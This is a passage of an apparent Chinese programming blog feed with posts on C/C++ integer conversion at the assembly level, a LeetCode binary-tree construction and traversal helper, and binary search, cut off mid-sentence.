&lt;p&gt;前缀和方法在数组元素不发生改变的情况下十分高效，但如果数组元素可能会发生改变，与朴素求和做法（不使用前缀和数组，而是直接遍历区间元素累计求和）相比，前缀和数组需要 O(n) 的时间来进行更新。这两种做法要么查询是 O(1)、更新是 O(n)，要么查询是 O(n)、更新是 O(1)，那有没有一种折衷的方案，使得查询和更新效率都不至于太低呢？本文将介绍的树状数组就符合这样的条件。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>从机器指令的角度看一些位级操作</title>
    <link href="http://lordaeronesz.github.io/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/"/>
    <id>http://lordaeronesz.github.io/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/</id>
    <published>2024-01-06T10:59:42.000Z</published>
    <updated>2024-01-19T13:45:15.414Z</updated>
    
    <content type="html"><![CDATA[<p>C/C++ 中有时会遇到一些位级操作，通常是一些隐式的类型转换，它们往往很难凭借高级语言层面的直觉来理解或记忆。本文旨在分析这些操作对应的汇编代码，从机器指令的角度来理解这类操作。</p><span id="more"></span><h1 id="补码数转换为更长的无符号数"><a href="#补码数转换为更长的无符号数" class="headerlink" title="补码数转换为更长的无符号数"></a>补码数转换为更长的无符号数</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span><span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -12345 4294954951</span><span class="token punctuation">&#125;</span></code></pre><p>首先看以上这个示例，一个短整型数据（2 字节）强制类型转换为无符号整型数据（4 字节）之后，得到的值却是一个看似毫不相关的结果。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> ptr<span class="token punctuation">,</span> size_t sz<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2x "</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先，为了更好地分析这类位级操作，这里编写了一个简单的字节打印函数，通过将指向变量的指针强制类型转换为 <code>unsigned char *</code> ，便可以很方便地通过增加数组下标来实现对每个字节的访问。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf</span><span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf ff ff</span><span class="token punctuation">&#125;</span></code></pre><p>通过打印变量 a 和 b 的位级表示，发现 a 的位级表示为：c7 ff，而 b 的位级表示为 c7 ff ff ff，这表明 b 在位级层面实际上进行了符号扩展（注意此处字节序为<strong>小端表示</strong>，即字节地址由高到低为 ff ff ff c7），再将其解释为无符号类型，用表达式表示就是：<code>unsigned b = (unsigned)(int)a;</code>.</p><p>在 MSVC 编译器下对前面的代码进行编译，得到以下代码：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov eax, 0ffffcfc7hmov word ptr [a], axmovsx eax, word ptr [a]mov dword ptr [b], eax</code></pre><p>将 a 赋值给 b 的指令为 <code>movsx</code>，该指令的作用是将源数据经过<strong>符号扩展</strong>后存入目的地址，相关的指令还有 <code>movzx</code>，作用是将源数据经过<strong>零扩展</strong>后存入目的地址，因此程序实际上是将 a 的比特位符号扩展后再存入 b 中。事实上，要对一个变量进行何种扩展，决定因素是<strong>源数据的类型</strong>，而与目标类型无关，这是 C 语言标准所规定的。</p><h1 id="截断补码数"><a href="#截断补码数" class="headerlink" title="截断补码数"></a>截断补码数</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span><span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -2147483648 0</span><span class="token punctuation">&#125;</span></code></pre><p>4 字节的整型转换为 2 字节的短整型，同样产生了令人意想不到的结果。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00 00 80</span><span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00</span><span class="token punctuation">&#125;</span></code></pre><p>由于整型的字节长度大于短整型，因此在类型转换过程中，必然要进行数位的截断，关键在于截断策略的选择。对于无符号数来说，很容易想到直接将高位字节部分截断，因为这样才能保证当整型数值 a 不是太大（小于短整型所能表示的最大数值）时，类型转换后数值保持不变。而根据上述字节打印结果，可以看到补码数值的截断策略与无符号数一致，以下汇编代码清楚地表明了这一点：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov dword ptr [a], 80000000hmov ax, word ptr [a]mov word ptr [b], ax</code></pre><p>在进行类型转换时，程序只是简单地将变量 a 的一个字（word），即两字节存入 b 中。因此补码数的截断，其本质上还是位级层面的截断，与该补码所表示的数值并无关系，不涉及到任何的算术运算，这就使得在对负数进行截断时，往往产生出乎意料的结果。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;C/C++ 中有时会遇到一些位级操作，通常是一些隐式的类型转换，它们往往很难凭借高级语言层面的直觉来理解或记忆。本文旨在分析这些操作对应的汇编代码，从机器指令的角度来理解这类操作。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机体系结构" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="位运算" scheme="http://lordaeronesz.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
    <category term="计算机体系结构" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>高效的LeetCode二叉树本地IDE调试方案</title>
    <link href="http://lordaeronesz.github.io/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/"/>
    <id>http://lordaeronesz.github.io/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/</id>
    <published>2023-10-17T10:59:42.000Z</published>
    <updated>2023-10-19T11:41:06.193Z</updated>
    
    <content type="html"><![CDATA[<p>在 LeetCode 刷题过程中，有时候遇到一些难以难以直接观察出来的错误，此时通常想要利用单步调试来解决，但奈何只有 LeetCode Plus 会员才可以使用其网页的调试功能。好在绝大部分本地 IDE 都具备十分强大的调试功能，我们只需要将自己的解题代码复制到本地，并编写简单的测试程序即可。但是对于二叉树相关的题，测试数据的编写显得不那么容易，本文编写了一个匹配 LeetCode 题目中的二叉树定义的类，该类包含一些基本的静态函数，能够很方便地实现二叉树的构造和二叉树的遍历。</p><span id="more"></span><h1 id="LeetCode-二叉树的序列表示方式"><a href="#LeetCode-二叉树的序列表示方式" class="headerlink" title="LeetCode 二叉树的序列表示方式"></a>LeetCode 二叉树的序列表示方式</h1><p>LeetCode 中针对二叉树的输入数据以一个<strong>层序遍历</strong>序列的形式给出。与通常我们所说的层序序列不同的是，该层序序列包含从根节点到最后一个非空结点之间的所有空结点，该空结点以 <strong>null</strong> 的标识符给出，以此保证根据此序列所构造二叉树的唯一性（单纯依靠常规的不含空结点的层序序列无法构造一棵唯一的二叉树）。以下是一个简单的例子：</p><p><strong>输入：</strong> <code>root = [3, 9, 20, null, null, 15, 7]</code></p><p><img src="/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/tree1.jpg"></p><h1 id="带构造与遍历的二叉树类"><a href="#带构造与遍历的二叉树类" class="headerlink" title="带构造与遍历的二叉树类"></a>带构造与遍历的二叉树类</h1><p>为了方便能在本地 IDE 中直接根据输入数据的格式构造二叉树，本文编写了两个简单的静态方法，来方便数据的输入与输出。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">null</span> <span class="token expression">INT32_MAX</span></span><span class="token keyword">struct</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> val<span class="token punctuation">;</span>TreeNode<span class="token operator">*</span> left<span class="token punctuation">,</span> <span class="token operator">*</span> right<span class="token punctuation">;</span><span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 带空结点的层序遍历</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span> buf<span class="token punctuation">;</span> <span class="token comment">// 输出缓冲</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token function">to_string</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"null"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>buf<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 去除末尾多余的空结点</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> val <span class="token operator">:</span> buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 根据层序序列创建二叉树</span><span class="token keyword">static</span> TreeNode<span class="token operator">*</span> <span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> order<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> order<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span><span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 指向当前结点的子结点</span>TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> lChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>lChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>fNode<span class="token operator">-></span>left <span class="token operator">=</span> lChild<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>lChild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>idx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>TreeNode<span class="token operator">*</span> rChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>rChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>fNode<span class="token operator">-></span>right <span class="token operator">=</span> rChild<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>rChild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>idx<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> root<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>使用的方法也很简单，由于两个方法都是 TreeNode 类中的静态方法，可使用 <code>::</code> 符对其进行调用。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> order <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TreeNode</span><span class="token double-colon punctuation">::</span><span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;在 LeetCode 刷题过程中，有时候遇到一些难以难以直接观察出来的错误，此时通常想要利用单步调试来解决，但奈何只有 LeetCode Plus 会员才可以使用其网页的调试功能。好在绝大部分本地 IDE 都具备十分强大的调试功能，我们只需要将自己的解题代码复制到本地，并编写简单的测试程序即可。但是对于二叉树相关的题，测试数据的编写显得不那么容易，本文编写了一个匹配 LeetCode 题目中的二叉树定义的类，该类包含一些基本的静态函数，能够很方便地实现二叉树的构造和二叉树的遍历。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>二分搜索的几种写法与常见问题</title>
    <link href="http://lordaeronesz.github.io/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://lordaeronesz.github.io/2023/09/17/%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E5%86%99%E6%B3%95%E4%B8%8E%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</id>
    <published>2023-09-17T01:03:08.000Z</published>
    <updated>2023-09-18T03:52:28.364Z</updated>
    
    <content type="html"><![CDATA[<p>最近在比赛和刷题的时候经常遇到二分答案的题，但时不时会因为一些细节上的错误而浪费时间，本文旨在整理常见的二分搜索的写法、二分搜索可能会遇到的一些小问题，以及 <em>C++</em> 中与二分搜索相关的库函数，以免今后再犯类似的错误。</p><span id="more"></span><h1 id="二分搜索的写法"><a href="#二分搜索的写法" class="headerlink" title="二分搜索的写法"></a>二分搜索的写法</h1><h2 id="查找某个值的下标"><a href="#查找某个值的下标" class="headerlink" title="查找某个值的下标"></a>查找某个值的下标</h2><p>定义函数 <code>binarySearch(nums, target)</code> 为搜索有序数组 <em>nums</em> 中是否存在 <em>i</em> 使得 <code>nums[i] == target</code>，如果是，返回 <em>i</em>，否则返回 <em>-1</em>.</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这应该是大部分人最早接触的二分形式，也是最简单、最好理解的二分写法，但如果 <em>nums</em> 中元素存在重复的情况，并且我们需要在 <em>nums</em> 中存在多个 <em>i</em> 使得 <code>nums[i] == target</code> 时返回最小的 <em>i</em>，这种写法就失效了，而这种情况往往就是解决大部分有关二分搜索的算法问题时会遇到的。</p><h2 id="查找左边界"><a href="#查找左边界" class="headerlink" title="查找左边界"></a>查找左边界</h2><p>要想成功实现对边界的查找，就需要对二分搜索的过程有一个更为深入的理解。还是采用与上面类似的写法，初始时将区间左右边界初始化为 <code>low = 0, high = n - 1;</code>. 在定义左右边界时我们应该注意到，待搜索的区间范围为 <em>low</em> 和 <em>high</em>，但是由于 <em>low</em> 和 <em>high</em> 本身就有可能为所要查找的最终结果 <em>i</em>，因此搜索目标位于<strong>闭区间</strong> [<em>low</em>, <em>high</em>] 内，实际上区间内的数据分布情况我们是不得而知的，而我们已经获取的信息其实是区间外的信息，即：</p><ul><li>当 <code>i &lt;= low - 1</code> 时，<code>nums[i] &lt; target</code>.</li><li>当 <code>i &gt;= high + 1</code> 时，<code>nums[i] &gt;= target</code>.</li></ul><p>以上信息即为二分搜索过程中的<strong>循环不变量</strong>。需要注意的是，当 <em>low</em> 和 <em>high</em> 本身就位于左右边界的情况下， <em>low - 1</em> 和 <em>high + 1</em> 已经超出数组范围，但由于 <em>nums</em> 是一个有序数组，因此我们可以这样考虑：<code>nums[-1] = -∞, nums[n] = +∞</code>. 因此上述的循环不变量在二分搜索开始时也满足。而要使得循环不变量在整个二分搜索过程中均满足，就需要在得到区间中点 <em>mid</em> 后，严格按照上述规则来更新区间左右端点：</p><ul><li>当 <code>nums[mid] &gt;= target</code> 时，要使得 <code>nums[high + 1] &gt;= target</code>，那么可令 <code>high + 1 = mid</code>，等价于 <code>high = mid - 1</code>.</li><li>当 <code>nums[mid] &lt; target</code> 时，要使得 <code>nums[low - 1] &lt; target</code>，令 <code>low - 1 = mid</code>，等价于 <code>low = mid + 1</code>.</li></ul><p>最终，循环条件为该闭区间不为空，表示仍然存在未确定的区间外信息，即  <code>low &lt;= high</code>（取等号是因为当 <code>low == 